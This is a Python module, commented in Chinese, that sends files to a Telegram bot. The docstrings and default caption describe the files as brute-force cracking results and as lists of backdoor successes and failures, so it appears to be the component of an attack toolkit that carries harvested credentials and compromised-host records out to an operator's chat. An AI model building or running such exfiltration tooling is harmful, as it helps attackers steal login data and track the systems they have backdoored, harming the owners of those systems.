"""Telegram 通知 —— 上传结果文件到 Telegram Bot."""

import os
from pathlib import Path
from typing import Optional

import requests


def send_document(
    file_path: str,
    bot_token: str,
    chat_id: str,
    caption: Optional[str] = None,
) -> bool:
    """通过 Telegram Bot API 发送文件.

    Args:
        file_path: 文件路径
        bot_token: Bot token (建议从环境变量读取)
        chat_id: Chat ID (建议从环境变量读取)
        caption: 附言

    Returns:
        是否发送成功
    """
    if not bot_token or not chat_id:
        print(f"⚠️ Telegram 未配置 (BOT_TOKEN/CHAT_ID 为空)，跳过上传: {file_path}")
        return False

    if not os.path.exists(file_path):
        print(f"⚠️ Telegram 上传失败：文件 {file_path} 不存在")
        return False

    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    caption_text = caption or f"爆破结果：{os.path.basename(file_path)}"

    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": chat_id, "caption": caption_text}
            resp = requests.post(url, data=data, files=files, timeout=30)
            if resp.status_code == 200:
                print(f"✅ 文件 {file_path} 已发送到 Telegram")
                return True
            else:
                print(f"❌ TG上传失败，状态码：{resp.status_code}，返回：{resp.text}")
                return False
    except Exception as e:
        print(f"❌ 发送到 TG 失败：{e}")
        return False


def upload_results(
    txt_file: str,
    bot_token: str,
    chat_id: str,
    also_xlsx: bool = True,
    also_hmsuccess: Optional[str] = None,
    also_hmfail: Optional[str] = None,
):
    """上传一组爆破结果文件到 Telegram.

    Args:
        txt_file: 主结果 TXT 文件
        bot_token: Bot token
        chat_id: Chat ID
        also_xlsx: 是否同时上传对应的 xlsx 文件
        also_hmsuccess: 后门成功文件路径
        also_hmfail: 后门失败文件路径
    """
    # 上传 TXT
    if os.path.exists(txt_file):
        print(f"\n📤 正在将 {txt_file} 上传至 Telegram ...")
        send_document(txt_file, bot_token, chat_id)
    else:
        print(f"⚠️ 结果文件 {txt_file} 不存在，跳过上传")

    # 上传 XLSX
    if also_xlsx:
        xlsx_file = txt_file.replace(".txt", ".xlsx")
        if os.path.exists(xlsx_file):
            print(f"📤 正在将 {xlsx_file} 上传至 Telegram ...")
            send_document(xlsx_file, bot_token, chat_id)
        else:
            print("⚠️ 没有找到对应的 xlsx 文件，跳过上传")

    # 上传后门文件
    for extra_file in [also_hmsuccess, also_hmfail]:
        if extra_file and os.path.exists(extra_file):
            print(f"📤 正在将 {extra_file} 上传至 Telegram ...")
            send_document(extra_file, bot_token, chat_id)
